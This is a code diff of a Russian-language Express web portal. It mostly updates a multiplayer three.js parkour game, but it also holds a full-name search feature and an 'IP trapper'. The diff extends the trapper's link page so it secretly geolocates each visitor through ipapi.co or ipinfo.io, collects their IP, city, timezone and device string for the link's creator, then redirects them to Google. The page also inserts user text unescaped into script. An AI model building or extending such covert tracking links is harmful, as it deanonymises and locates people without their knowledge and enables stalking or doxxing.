@@ -14,15 +14,14 @@ let globalArticles = [
         id: "promo",
         title: "Портал запущен!",
         desc: "Система готова к работе.",
-        content: "Все модули CtalkeP активированы. 3D-Паркур успешно интегрирован в систему!"
+        content: "Все модули CtalkeP активированы. 3D-Паркур обновлен: добавлены коллизии, захват мыши, никнеймы и глазки!"
     }
 ];
 let chatMessages = [];      
 
-// === МУЛЬТИПЛЕЕР ИГРЫ (ОНЛАЙН КООРДИНАТЫ) ===
-let onlinePlayers = {}; // { nickname: { x, y, z, rx, ry, isJumping, lastSeen } }
+// === МУЛЬТИПЛЕЕР ИГРЫ ===
+let onlinePlayers = {}; 
 
-// Очистка неактивных игроков из сессии паркура (кто не слал координаты более 7 секунд)
 setInterval(() => {
     const now = Date.now();
     for (const nick in onlinePlayers) {
@@ -32,9 +31,8 @@ setInterval(() => {
     }
 }, 3000);
 
-// === ГЕНЕРАЦИЯ ОДИНАКОВОЙ КАРТЫ ДЛЯ ВСЕХ ИГРОКОВ ===
-// Генерируем 50 платформ со строгими расчетами расстояния, чтобы прыжки всегда были возможны
-let parkourSeed = 12345;
+// === ГЕНЕРАЦИЯ ИСПРАВЛЕННОЙ КАРТЫ (СПАВН ВПЛОТНУЮ) ===
+let parkourSeed = 54321;
 function seededRandom() {
     let x = Math.sin(parkourSeed++) * 10000;
     return x - Math.floor(x);
@@ -43,28 +41,27 @@ function seededRandom() {
 let parkourPlatforms = [];
 function generateMap() {
     parkourPlatforms = [];
-    // Стартовая платформа (Спавн)
-    parkourPlatforms.push({ x: 0, y: 0, z: 0, w: 6, h: 1, d: 6, color: "#3b82f6" });
+    
+    // Спавн-зона (сделана длиннее и шире для удобства)
+    parkourPlatforms.push({ x: 0, y: 0, z: 0, w: 6, h: 0.8, d: 6, color: "#3b82f6" });
     
     let currentX = 0;
     let currentY = 0;
-    let currentZ = -6;
+    let currentZ = -3.5; // Сразу на границе спавна
 
     for (let i = 0; i < 60; i++) {
-        // Вычисляем смещение. Прыжок на ПК/телефоне максимум 4.5 единицы по горизонтали и 1.2 по вертикали
-        let dx = (seededRandom() - 0.5) * 4; // влево/вправо
-        let dy = (seededRandom() - 0.3) * 1.5; // вверх/вниз
-        let dz = -(seededRandom() * 3 + 2.5); // строго вперед (от -2.5 до -5.5 метров)
+        // Жесткие рамки прыжка для 100% проходимости
+        let dx = (seededRandom() - 0.5) * 2.5; // Смещение влево/вправо (небольшое)
+        let dy = (seededRandom() - 0.4) * 0.8; // Перепад высоты (очень мягкий)
+        let dz = -(seededRandom() * 1.5 + 2.3); // Расстояние вперед строго от 2.3 до 3.8 метров (идеально для прыжка)
 
         currentX += dx;
         currentY += dy;
         currentZ += dz;
 
-        // Ограничиваем резкие перепады высоты для играбельности
-        if (currentY < -5) currentY = -3;
-        if (currentY > 7) currentY = 5;
+        if (currentY < -4) currentY = -2;
+        if (currentY > 5) currentY = 3;
 
-        // Разноцветные неоновые цвета для платформ
         const colors = ["#ef4444", "#10b981", "#8b5cf6", "#f59e0b", "#ec4899", "#06b6d4"];
         const color = colors[Math.floor(seededRandom() * colors.length)];
 
@@ -73,9 +70,9 @@ function generateMap() {
             x: parseFloat(currentX.toFixed(2)),
             y: parseFloat(currentY.toFixed(2)),
             z: parseFloat(currentZ.toFixed(2)),
-            w: parseFloat((seededRandom() * 2 + 1.5).toFixed(2)), // ширина платформы
-            h: 0.5,
-            d: parseFloat((seededRandom() * 2 + 1.5).toFixed(2)), // глубина платформы
+            w: parseFloat((seededRandom() * 1.5 + 2.2).toFixed(2)), // Платформы стали шире
+            h: 0.6,
+            d: parseFloat((seededRandom() * 1.5 + 2.2).toFixed(2)),
             color: color
         });
     }
@@ -110,12 +107,7 @@ app.get('/', (req, res) => {
         ::-webkit-scrollbar { width: 5px; }
         ::-webkit-scrollbar-track { background: #050505; }
         ::-webkit-scrollbar-thumb { background: #1a1a1a; border-radius: 3px; }
-        
-        /* Стили для сенсорных джойстиков на смартфонах */
-        .joystick-zone {
-            touch-action: none;
-            user-select: none;
-        }
+        .joystick-zone { touch-action: none; user-select: none; }
     </style>
 </head>
 <body class="font-sans min-h-screen flex flex-col justify-between">
@@ -214,36 +206,32 @@ app.get('/', (req, res) => {
                 </div>
             </div>
         </main>
-
-        <footer class="text-center p-4 text-xs text-zinc-700 border-t border-zinc-950 bg-[#030303]">
-            CtalkeP Portal.
-        </footer>
     </div>
 
     <div id="gameView" class="hidden fixed inset-0 z-50 bg-[#020202] select-none flex flex-col">
         <div class="absolute top-4 left-4 right-4 flex justify-between items-center z-50 pointer-events-none">
-            <div class="bg-black/80 px-4 py-2 rounded-lg border border-zinc-800 flex items-center gap-3 pointer-events-auto">
-                <span class="text-xs text-zinc-400">Игрок:</span>
-                <span class="text-sm font-bold text-blue-400" id="gameUserNick">Аноним</span>
-                <span class="text-xs bg-red-900/40 text-red-400 px-2 py-0.5 rounded border border-red-900/40" id="pingIndicator">СЕТЬ: OK</span>
+            <div class="bg-black/95 px-4 py-2.5 rounded-lg border border-zinc-800 flex flex-col gap-1 pointer-events-auto">
+                <div class="flex items-center gap-3">
+                    <span class="text-xs text-zinc-400">Игрок:</span>
+                    <span class="text-sm font-bold text-blue-400" id="gameUserNick">Аноним</span>
+                    <span class="text-xs bg-green-900/40 text-green-400 px-2 py-0.5 rounded border border-green-900/40" id="pingIndicator">СЕТЬ: OK</span>
+                </div>
+                <div class="text-[10px] text-zinc-500 hidden md:block">Кликни по экрану, чтобы захватить мышь. Выход — ESC.</div>
             </div>
             <button onclick="exitParkourGame()" class="bg-red-600 hover:bg-red-700 text-white font-bold px-5 py-2.5 rounded-lg text-sm transition pointer-events-auto shadow-lg shadow-red-900/20">
                 ВЫЙТИ В ЛОББИ
             </button>
         </div>
 
-        <div id="threeJsContainer" class="w-full h-full"></div>
+        <div id="threeJsContainer" class="w-full h-full cursor-pointer"></div>
 
         <div id="mobileControls" class="hidden absolute inset-0 pointer-events-none select-none">
             <div id="joystickBoundary" class="absolute bottom-10 left-10 w-32 h-32 bg-white/5 border border-white/10 rounded-full flex items-center justify-center pointer-events-auto joystick-zone">
-                <div id="joystickKnob" class="w-12 h-12 bg-blue-500/80 rounded-full transition-all duration-75"></div>
+                <div id="joystickKnob" class="w-12 h-12 bg-blue-500/80 rounded-full"></div>
             </div>
-
             <div id="jumpButton" class="absolute bottom-12 right-12 w-20 h-20 bg-blue-600/60 active:bg-blue-600/90 border border-blue-500 rounded-full flex items-center justify-center pointer-events-auto shadow-lg shadow-blue-500/20 active:scale-95 transition">
                 <span class="text-white text-xs font-bold uppercase tracking-wider">UP</span>
             </div>
-            
-            <div class="absolute bottom-4 left-1/2 -translate-x-1/2 text-[10px] text-zinc-600">Двигайте правой половиной экрана для обзора</div>
         </div>
     </div>
 
@@ -256,14 +244,14 @@ app.get('/', (req, res) => {
     </div>
 
     <script>
-        let myNickname = localStorage.getItem('nickname') || 'Аноним';
+        let myNickname = localStorage.getItem('nickname') || 'Игрок_' + Math.floor(Math.random()*900 + 100);
         let myBalance = parseFloat(localStorage.getItem('balance')) || 0.0;
         let hasTag = localStorage.getItem('hasTag') === 'true';
         let dailyVisits = parseInt(localStorage.getItem('dailyVisits')) || 0;
         let lastVisitDate = localStorage.getItem('lastVisitDate');
         let localArticles = JSON.parse(localStorage.getItem('saved_articles')) || [];
 
-        document.getElementById('nicknameInput').value = myNickname === 'Аноним' ? '' : myNickname;
+        document.getElementById('nicknameInput').value = myNickname.startsWith('Игрок_') ? '' : myNickname;
         updateUI();
 
         const today = new Date().toDateString();
@@ -280,13 +268,12 @@ app.get('/', (req, res) => {
 
         function saveProfile() {
             const input = document.getElementById('nicknameInput').value.trim();
-            myNickname = input || 'Аноним';
+            myNickname = input || 'Игрок_' + Math.floor(Math.random()*900 + 100);
             localStorage.setItem('nickname', myNickname);
             updateUI();
-            alert('Профиль обновлен локально!');
+            alert('Профиль обновлен!');
         }
 
-        // ПОИСК ФИО
         function searchFIO() {
             const query = document.getElementById('fioInput').value.trim();
             if (!query) return alert('Введите ФИО!');
@@ -304,7 +291,6 @@ app.get('/', (req, res) => {
             \`;
         }
 
-        // УЗНАТЬ IP
         let trapCheckInterval = null;
         async function generateTrap() {
             const msgInput = document.getElementById('trapMessageInput').value.trim();
@@ -328,13 +314,12 @@ app.get('/', (req, res) => {
                     if (statusData.status === 'caught') {
                         clearInterval(trapCheckInterval);
                         trapStatus.className = "text-xs text-green-400 bg-green-950/10 p-3 rounded-lg border border-green-900/30";
-                        trapStatus.innerHTML = '<strong>ПЕРЕХОД ЗАФИКСИРОВАН!</strong><br>IP: ' + statusData.data.ip + '<br>Устройство: ' + statusData.data.device.substring(0,60) + '...';
+                        trapStatus.innerHTML = '<strong>ПЕРЕХОД ЗАФИКСИРОВАН!</strong><br>IP: ' + statusData.data.ip + '<br>Город: ' + statusData.data.city + '<br>Часовой пояс: ' + statusData.data.timezone + '<br>Устройство: ' + statusData.data.device.substring(0,50) + '...';
                     }
                 }, 2000);
             }
         }
 
-        // СТАТЬИ
         async function loadArticles() {
             try {
                 const res = await fetch('/api/articles');
@@ -387,7 +372,6 @@ app.get('/', (req, res) => {
         }
         function closeModal() { document.getElementById('articleModal').classList.add('hidden'); }
 
-        // ЧАТ ОПРОСЫ
         async function fetchMessages() {
             try {
                 const res = await fetch('/api/chat/messages');
@@ -439,30 +423,25 @@ app.get('/', (req, res) => {
         // ==========================================
         let scene, camera, renderer;
         let platforms = [];
-        let otherPlayers = {}; // Модели других игроков на сцене: { nickname: { group, headMesh } }
+        let otherPlayers = {}; 
         let isGameActive = false;
         let multiplayerInterval = null;
 
-        // Физика и состояние локального игрока
         let playerPos = { x: 0, y: 1.5, z: 0 };
         let playerVelocity = { x: 0, y: 0, z: 0 };
-        let cameraRot = { pitch: 0, yaw: 0 }; // Углы поворота камеры
+        let cameraRot = { pitch: 0, yaw: 0 }; 
         let isGrounded = false;
-        const gravity = -18.5; // Сила притяжения
-        const jumpStrength = 7.8; // Сила прыжка
-        const moveSpeed = 6.2; // Скорость бега
+        
+        const gravity = -20.5; // Слегка увеличили тяжесть для четкости приземления
+        const jumpStrength = 8.5; 
+        const moveSpeed = 6.5; 
 
-        // Кнопки клавиатуры
         let keys = { w: false, a: false, s: false, d: false, space: false };
-
-        // Состояние сенсорного управления
         let isTouchDevice = false;
         let joystickActive = false;
         let joystickStart = { x: 0, y: 0 };
-        let joystickMove = { x: 0, y: 0 };
         let touchMoveVector = { x: 0, z: 0 };
 
-        // Инициализация детекции тачскрина
         if ('ontouchstart' in window || navigator.maxTouchPoints > 0) {
             isTouchDevice = true;
         }
@@ -476,6 +455,8 @@ app.get('/', (req, res) => {
             if (isTouchDevice) {
                 document.getElementById('mobileControls').classList.remove('hidden');
                 setupMobileEvents();
+            } else {
+                setupPointerLock();
             }
 
             init3D();
@@ -483,17 +464,23 @@ app.get('/', (req, res) => {
             startMultiplayerLoop();
         }
 
+        function setupPointerLock() {
+            const container = document.getElementById('threeJsContainer');
+            container.addEventListener('click', () => {
+                container.requestPointerLock();
+            });
+        }
+
         function exitParkourGame() {
             isGameActive = false;
             clearInterval(multiplayerInterval);
+            document.exitPointerLock();
             
-            // Удаляем слушатели событий физики
             window.removeEventListener('keydown', handleKeyDown);
             window.removeEventListener('keyup', handleKeyUp);
             window.removeEventListener('mousemove', handleMouseMove);
             window.removeEventListener('resize', onWindowResize);
 
-            // Очищаем DOM сцены
             const container = document.getElementById('threeJsContainer');
             container.innerHTML = '';
 
@@ -505,48 +492,41 @@ app.get('/', (req, res) => {
         function init3D() {
             const container = document.getElementById('threeJsContainer');
             
-            // Сцена
             scene = new THREE.Scene();
-            scene.fog = new THREE.FogExp2('#050505', 0.012);
+            scene.fog = new THREE.FogExp2('#050505', 0.015);
 
-            // Камера (fov, aspect, near, far)
             camera = new THREE.PerspectiveCamera(65, window.innerWidth / window.innerHeight, 0.1, 1000);
             camera.position.set(playerPos.x, playerPos.y, playerPos.z);
 
-            // Рендерер
             renderer = new THREE.WebGLRenderer({ antialias: true });
             renderer.setSize(window.innerWidth, window.innerHeight);
             renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
             renderer.setClearColor('#050505', 1);
             container.appendChild(renderer.domElement);
 
-            // Освещение (красивое неоновое заполнение)
-            const ambientLight = new THREE.AmbientLight(0xffffff, 0.15);
+            const ambientLight = new THREE.AmbientLight(0xffffff, 0.25);
             scene.add(ambientLight);
 
-            const dirLight = new THREE.DirectionalLight(0x3b82f6, 1);
+            const dirLight = new THREE.DirectionalLight(0x3b82f6, 1.2);
             dirLight.position.set(10, 40, 10);
             scene.add(dirLight);
 
-            // Построение карты платформ (подгружаем с сервера)
             fetch('/api/parkour/map')
                 .then(res => res.json())
                 .then(mapPlatforms => {
                     buildMap(mapPlatforms);
                 });
 
-            // Эффект бездны — сетка на самом дне
             const gridHelper = new THREE.GridHelper(400, 50, 0xff0055, 0x111111);
             gridHelper.position.y = -15;
             scene.add(gridHelper);
 
-            // Запускаем игровой цикл анимации
             let lastTime = performance.now();
             function animate(time) {
                 if (!isGameActive) return;
                 requestAnimationFrame(animate);
 
-                const dt = Math.min((time - lastTime) / 1000, 0.1); // защита от просадки кадров
+                const dt = Math.min((time - lastTime) / 1000, 0.1); 
                 lastTime = time;
 
                 updatePlayerPhysics(dt);
@@ -561,18 +541,15 @@ app.get('/', (req, res) => {
         }
 
         function buildMap(mapData) {
-            // Очищаем старые платформы
             platforms.forEach(p => scene.remove(p.mesh));
             platforms = [];
 
             mapData.forEach(p => {
                 const geometry = new THREE.BoxGeometry(p.w, p.h, p.d);
-                
-                // Светящийся неоновый материал
                 const material = new THREE.MeshPhongMaterial({
                     color: new THREE.Color(p.color),
                     emissive: new THREE.Color(p.color),
-                    emissiveIntensity: 0.35,
+                    emissiveIntensity: 0.4,
                     shininess: 100
                 });
                 
@@ -587,15 +564,12 @@ app.get('/', (req, res) => {
                 });
             });
 
-            // Возвращаем игрока на спавн
             respawnPlayer();
         }
 
-        // === ФИЗИКА И ПЕРЕМЕЩЕНИЕ ===
         function setupPhysicsEvents() {
             window.addEventListener('keydown', handleKeyDown);
             window.addEventListener('keyup', handleKeyUp);
-            // Для поворота камеры на ПК — при зажатой левой кнопке мыши
             window.addEventListener('mousemove', handleMouseMove);
         }
 
@@ -615,15 +589,12 @@ app.get('/', (req, res) => {
             if (e.code === 'Space') keys.space = false;
         }
 
-        let isPointerLocked = false;
         function handleMouseMove(e) {
-            // Двигаем камеру только если зажата мышка или активен PointerLock
-            if (e.buttons === 1 || document.pointerLockElement) {
-                const sens = 0.003;
+            // Двигаем камеру ТОЛЬКО если захвачен Pointer Lock (на ПК) или зажата кнопка мыши
+            if (document.pointerLockElement || e.buttons === 1) {
+                const sens = 0.0025;
                 cameraRot.yaw -= e.movementX * sens;
                 cameraRot.pitch -= e.movementY * sens;
-
-                // Лимитируем наклон головы вверх-вниз (90 градусов)
                 cameraRot.pitch = Math.max(-Math.PI / 2.1, Math.min(Math.PI / 2.1, cameraRot.pitch));
             }
         }
@@ -635,10 +606,8 @@ app.get('/', (req, res) => {
         }
 
         function updatePlayerPhysics(dt) {
-            // ПРИТЯЖЕНИЕ
             playerVelocity.y += gravity * dt;
 
-            // ДВИЖЕНИЕ НА ПК И МОБИЛЬНЫХ
             let moveX = 0;
             let moveZ = 0;
 
@@ -652,14 +621,12 @@ app.get('/', (req, res) => {
                 moveZ = touchMoveVector.z;
             }
 
-            // Направление движения с учетом поворота взгляда
             const sin = Math.sin(cameraRot.yaw);
             const cos = Math.cos(cameraRot.yaw);
             
             let worldMoveX = moveX * cos - moveZ * sin;
             let worldMoveZ = moveX * sin + moveZ * cos;
 
-            // Нормализуем скорость по диагонали
             const length = Math.sqrt(worldMoveX * worldMoveX + worldMoveZ * worldMoveZ);
             if (length > 0) {
                 worldMoveX = (worldMoveX / length) * moveSpeed;
@@ -670,13 +637,12 @@ app.get('/', (req, res) => {
             playerPos.z += worldMoveZ * dt;
             playerPos.y += playerVelocity.y * dt;
 
-            // ПРОВЕРКА КОЛЛИЗИЙ С ПЛАТФОРМАМИ (СТОЛКНОВЕНИЕ СВЕРХУ)
+            // СВЕРХНАДЕЖНЫЕ КОЛЛИЗИИ
             isGrounded = false;
             const playerHeight = 1.3;
-            const playerRadius = 0.45;
+            const playerRadius = 0.4;
 
             platforms.forEach(p => {
-                // Прямоугольная граница коллизии платформы
                 const minX = p.x - p.w/2 - playerRadius;
                 const maxX = p.x + p.w/2 + playerRadius;
                 const minZ = p.z - p.d/2 - playerRadius;
@@ -684,23 +650,23 @@ app.get('/', (req, res) => {
 
                 if (playerPos.x > minX && playerPos.x < maxX && playerPos.z > minZ && playerPos.z < maxZ) {
                     const platformTop = p.y + p.h/2;
-                    // Проверяем находится ли игрок на уровне платформы
-                    if (playerPos.y - playerHeight <= platformTop && playerPos.y - playerHeight >= platformTop - 0.5 && playerVelocity.y <= 0) {
-                        playerPos.y = platformTop + playerHeight;
-                        playerVelocity.y = 0;
-                        isGrounded = true;
+                    // Проверяем, приземлился ли игрок строго на верхушку платформы
+                    if (playerPos.y - playerHeight <= platformTop && playerPos.y - playerHeight >= platformTop - 0.75) {
+                        if (playerVelocity.y <= 0) {
+                            playerPos.y = platformTop + playerHeight;
+                            playerVelocity.y = 0;
+                            isGrounded = true;
+                        }
                     }
                 }
             });
 
-            // ПРЫЖОК
             if (isGrounded && (keys.space || mobileJumpPressed)) {
                 playerVelocity.y = jumpStrength;
                 isGrounded = false;
-                mobileJumpPressed = false; // гасим мобильный триггер
+                mobileJumpPressed = false; 
             }
 
-            // ПАДЕНИЕ В БЕЗДНУ (СПАВН)
             if (playerPos.y < -13) {
                 respawnPlayer();
             }
@@ -708,33 +674,26 @@ app.get('/', (req, res) => {
 
         function updateCamera() {
             camera.position.set(playerPos.x, playerPos.y, playerPos.z);
-            
-            // Направление взгляда по углам
             const target = new THREE.Vector3();
             target.x = playerPos.x + Math.sin(cameraRot.yaw) * Math.cos(cameraRot.pitch);
             target.y = playerPos.y + Math.sin(cameraRot.pitch);
             target.z = playerPos.z - Math.cos(cameraRot.yaw) * Math.cos(cameraRot.pitch);
-            
             camera.lookAt(target);
         }
 
-        // === МОБИЛЬНЫЙ СЕНСОРНЫЙ ДЖОЙСТИК (УДОБНЫЙ И ПЛАВНЫЙ) ===
         let mobileJumpPressed = false;
         function setupMobileEvents() {
             const joystickBoundary = document.getElementById('joystickBoundary');
             const joystickKnob = document.getElementById('joystickKnob');
             const jumpButton = document.getElementById('jumpButton');
 
-            // Кнопка прыжка
             jumpButton.addEventListener('touchstart', (e) => {
                 e.preventDefault();
                 mobileJumpPressed = true;
             });
 
-            // Обзор свайпами по правой половине экрана
             let touchStartPoint = { x: 0, y: 0 };
             window.addEventListener('touchstart', (e) => {
-                // Берем только тачи на правой стороне экрана
                 for (let i = 0; i < e.touches.length; i++) {
                     if (e.touches[i].clientX > window.innerWidth / 2) {
                         touchStartPoint.x = e.touches[i].clientX;
@@ -749,7 +708,7 @@ app.get('/', (req, res) => {
                         const dx = e.touches[i].clientX - touchStartPoint.x;
                         const dy = e.touches[i].clientY - touchStartPoint.y;
 
-                        const sens = 0.005;
+                        const sens = 0.006;
                         cameraRot.yaw -= dx * sens;
                         cameraRot.pitch -= dy * sens;
                         cameraRot.pitch = Math.max(-Math.PI / 2.1, Math.min(Math.PI / 2.1, cameraRot.pitch));
@@ -760,7 +719,6 @@ app.get('/', (req, res) => {
                 }
             });
 
-            // Движение левого джойстика
             joystickBoundary.addEventListener('touchstart', (e) => {
                 e.preventDefault();
                 joystickActive = true;
@@ -775,7 +733,7 @@ app.get('/', (req, res) => {
                 const dx = touch.clientX - joystickStart.x;
                 const dy = touch.clientY - joystickStart.y;
                 
-                const limit = 50; // радиус хода ручки
+                const limit = 50; 
                 const dist = Math.sqrt(dx*dx + dy*dy);
                 
                 let moveX = dx;
@@ -786,8 +744,6 @@ app.get('/', (req, res) => {
                 }
 
                 joystickKnob.style.transform = \`translate(\${moveX}px, \${moveY}px)\`;
-
-                // Записываем вектор движения
                 touchMoveVector.x = moveX / limit;
                 touchMoveVector.z = moveY / limit;
             });
@@ -799,11 +755,36 @@ app.get('/', (req, res) => {
             });
         }
 
-        // === ОНЛАЙН СИНХРОНИЗАЦИЯ СЕРВЕРА (МУЛЬТИПЛЕЕР) ===
+        // ВЕРТИКАЛЬНАЯ ГЕНЕРАЦИЯ 2D-НИКНЕЙМА НА CANVAS ДЛЯ THREE.JS
+        function createNicknameTexture(text) {
+            const canvas = document.createElement('canvas');
+            canvas.width = 256;
+            canvas.height = 64;
+            const ctx = canvas.getContext('2d');
+            
+            ctx.clearRect(0, 0, 256, 64);
+            
+            // Тёмная плашка под никнейм для контраста
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.65)';
+            ctx.roundRect ? ctx.roundRect(10, 10, 236, 44, 8) : ctx.rect(10, 10, 236, 44);
+            ctx.fill();
+
+            // Текст никнейма
+            ctx.font = 'bold 20px sans-serif';
+            ctx.fillStyle = '#60a5fa'; // Красивый небесно-синий цвет
+            ctx.textAlign = 'center';
+            ctx.fillText(text, 128, 38);
+
+            const texture = new THREE.CanvasTexture(canvas);
+            const material = new THREE.SpriteMaterial({ map: texture, transparent: true });
+            const sprite = new THREE.Sprite(material);
+            sprite.scale.set(1.5, 0.4, 1);
+            return sprite;
+        }
+
         function startMultiplayerLoop() {
             multiplayerInterval = setInterval(async () => {
                 try {
-                    // Отправляем свои координаты и углы головы на сервер
                     const res = await fetch('/api/parkour/sync', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -812,23 +793,17 @@ app.get('/', (req, res) => {
                             x: parseFloat(playerPos.x.toFixed(2)),
                             y: parseFloat(playerPos.y.toFixed(2)),
                             z: parseFloat(playerPos.z.toFixed(2)),
-                            ry: cameraRot.yaw, // Поворот тела
-                            rx: cameraRot.pitch // Наклон головы вверх/вниз
+                            ry: cameraRot.yaw, 
+                            rx: cameraRot.pitch 
                         })
                     });
                     const serverPlayers = await res.json();
                     updateOtherPlayersData(serverPlayers);
-                    document.getElementById('pingIndicator').textContent = "СЕТЬ: OK";
-                    document.getElementById('pingIndicator').className = "text-xs bg-green-900/40 text-green-400 px-2 py-0.5 rounded border border-green-900/40";
-                } catch (e) {
-                    document.getElementById('pingIndicator').textContent = "СЕТЬ: СБОЙ";
-                    document.getElementById('pingIndicator').className = "text-xs bg-red-900/40 text-red-400 px-2 py-0.5 rounded border border-red-900/40";
-                }
-            }, 100); // 10 раз в секунду
+                } catch (e) {}
+            }, 100); 
         }
 
         function updateOtherPlayersData(serverPlayers) {
-            // Удаляем вышедших игроков
             for (const nick in otherPlayers) {
                 if (!serverPlayers[nick]) {
                     scene.remove(otherPlayers[nick].group);
@@ -836,41 +811,72 @@ app.get('/', (req, res) => {
                 }
             }
 
-            // Добавляем новых или обновляем текущих
             for (const nick in serverPlayers) {
-                if (nick === myNickname) continue; // Себя не рисуем
+                if (nick === myNickname) continue; 
 
                 const pData = serverPlayers[nick];
 
                 if (!otherPlayers[nick]) {
-                    // Создаем красивую 3D модельку игрока
                     const group = new THREE.Group();
 
-                    // Тело (Неоновый цилиндр)
+                    // ТЕЛО (цилиндр)
                     const bodyGeo = new THREE.CylinderGeometry(0.3, 0.3, 1.2, 8);
-                    const bodyMat = new THREE.MeshPhongMaterial({ color: 0x3b82f6, emissive: 0x3b82f6, emissiveIntensity: 0.2 });
+                    const bodyMat = new THREE.MeshPhongMaterial({ color: 0x3b82f6, emissive: 0x1d4ed8, emissiveIntensity: 0.3 });
                     const bodyMesh = new THREE.Mesh(bodyGeo, bodyMat);
                     bodyMesh.position.y = 0.6;
                     group.add(bodyMesh);
 
-                    // Свечение у головы
-                    const headGeo = new THREE.SphereGeometry(0.28, 8, 8);
-                    const headMat = new THREE.MeshPhongMaterial({ color: 0xff00ff, emissive: 0xff00ff, emissiveIntensity: 0.5 });
+                    // ГОЛОВА
+                    const headGroup = new THREE.Group();
+                    headGroup.position.y = 1.35;
+
+                    const headGeo = new THREE.SphereGeometry(0.28, 12, 12);
+                    const headMat = new THREE.MeshPhongMaterial({ color: 0xff00ff, emissive: 0x701a75, emissiveIntensity: 0.4 });
                     const headMesh = new THREE.Mesh(headGeo, headMat);
-                    headMesh.position.y = 1.35;
-                    group.add(headMesh);
+                    headGroup.add(headMesh);
+
+                    // МИЛЫЕ ГЛАЗКИ КРАСИВЫЕ (Левый и Правый)
+                    const eyeGeo = new THREE.SphereGeometry(0.06, 8, 8);
+                    const eyeMat = new THREE.MeshBasicMaterial({ color: 0xffffff });
+                    
+                    const pupilGeo = new THREE.SphereGeometry(0.03, 8, 8);
+                    const pupilMat = new THREE.MeshBasicMaterial({ color: 0x000000 });
+
+                    // Левый глаз
+                    const leftEye = new THREE.Group();
+                    const leftWhite = new THREE.Mesh(eyeGeo, eyeMat);
+                    const leftPupil = new THREE.Mesh(pupilGeo, pupilMat);
+                    leftPupil.position.set(0, 0, 0.04); // Зрачок чуть вперед
+                    leftEye.add(leftWhite, leftPupil);
+                    leftEye.position.set(-0.11, 0.05, 0.22); // Смещение вперед на лицевую сторону
+                    headGroup.add(leftEye);
+
+                    // Правый глаз
+                    const rightEye = new THREE.Group();
+                    const rightWhite = new THREE.Mesh(eyeGeo, eyeMat);
+                    const rightPupil = new THREE.Mesh(pupilGeo, pupilMat);
+                    rightPupil.position.set(0, 0, 0.04);
+                    rightEye.add(rightWhite, rightPupil);
+                    rightEye.position.set(0.11, 0.05, 0.22);
+                    headGroup.add(rightEye);
+
+                    group.add(headGroup);
+
+                    // КРАСИВЫЙ НИКНЕЙМ НАД ГОЛОВОЙ (Плывет в 3D)
+                    const nickSprite = createNicknameTexture(nick);
+                    nickSprite.position.set(0, 1.95, 0); // Повесили ровно над головой
+                    group.add(nickSprite);
 
                     scene.add(group);
 
                     otherPlayers[nick] = {
                         group: group,
-                        headMesh: headMesh,
+                        headMesh: headGroup, // Вращаем всю группу головы вместе с глазками!
                         targetPos: { x: pData.x, y: pData.y, z: pData.z },
                         targetRy: pData.ry,
                         targetRx: pData.rx
                     };
                 } else {
-                    // Обновляем цель для интерполяции
                     otherPlayers[nick].targetPos = { x: pData.x, y: pData.y, z: pData.z };
                     otherPlayers[nick].targetRy = pData.ry;
                     otherPlayers[nick].targetRx = pData.rx;
@@ -878,22 +884,17 @@ app.get('/', (req, res) => {
             }
         }
 
-        // Сглаживание движения игроков
         function renderOtherPlayers() {
-            const lerpFactor = 0.2; // Плавное скольжение
+            const lerpFactor = 0.25; 
             for (const nick in otherPlayers) {
                 const player = otherPlayers[nick];
                 const group = player.group;
 
-                // Плавно двигаем к целевым координатам
                 group.position.x += (player.targetPos.x - group.position.x) * lerpFactor;
-                group.position.y += (player.targetPos.y - 1.4 - group.position.y) * lerpFactor; // Фикс высоты
+                group.position.y += (player.targetPos.y - 1.4 - group.position.y) * lerpFactor; 
                 group.position.z += (player.targetPos.z - group.position.z) * lerpFactor;
 
-                // Поворачиваем тело к углу yaw
                 group.rotation.y += (player.targetRy - group.rotation.y) * lerpFactor;
-
-                // Наклоняем голову игрока вверх/вниз
                 player.headMesh.rotation.x += (player.targetRx - player.headMesh.rotation.x) * lerpFactor;
             }
         }
@@ -909,7 +910,7 @@ app.get('/', (req, res) => {
     `);
 });
 
-// === API ТРЭППЕРА IP ===
+// === API ТРЭППЕРА IP (С ОПРЕДЕЛЕНИЕМ ГОРОДА) ===
 app.post('/api/ip/create', (req, res) => {
     const id = Math.random().toString(36).substring(2, 8);
     currentTrap = {
@@ -937,17 +938,48 @@ app.get('/t/:id', (req, res) => {
         <body style="background:#050505;color:#e5e7eb;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
             ${customTextHtml}
             <script>
-                const data = { ip: "${ip}", device: navigator.userAgent, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };
-                const host = window.location.protocol + '//' + window.location.host;
-                fetch(host + '/api/ip/collect/${id}', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                }).then(() => {
-                    if ("${currentTrap.customText}" === "") { window.location.href = "https://www.google.com"; }
-                }).catch(() => {
-                    if ("${currentTrap.customText}" === "") { window.location.href = "https://www.google.com"; }
+                // Локатор города, провайдера и таймзоны
+                fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(geo => {
+                    const data = { 
+                        ip: geo.ip || "${ip}", 
+                        device: navigator.userAgent, 
+                        timezone: geo.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        city: geo.city || "Неизвестно"
+                    };
+                    sendData(data);
+                })
+                .catch(() => {
+                    // Резервный локатор
+                    fetch('https://ipinfo.io/json')
+                    .then(res => res.json())
+                    .then(geo => {
+                        const data = { 
+                            ip: geo.ip || "${ip}", 
+                            device: navigator.userAgent, 
+                            timezone: geo.timezone || "Не определен",
+                            city: geo.city || "Неизвестно"
+                        };
+                        sendData(data);
+                    })
+                    .catch(() => {
+                        sendData({ ip: "${ip}", device: navigator.userAgent, timezone: "Неизвестно", city: "Неизвестно" });
+                    });
                 });
+
+                function sendData(data) {
+                    const host = window.location.protocol + '//' + window.location.host;
+                    fetch(host + '/api/ip/collect/${id}', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    }).then(() => {
+                        if ("${currentTrap.customText}" === "") { window.location.href = "https://www.google.com"; }
+                    }).catch(() => {
+                        if ("${currentTrap.customText}" === "") { window.location.href = "https://www.google.com"; }
+                    });
+                }
             </script>
         </body>
         </html>
@@ -961,6 +993,7 @@ app.post('/api/ip/collect/:id', (req, res) => {
             ip: req.body.ip,
             device: req.body.device,
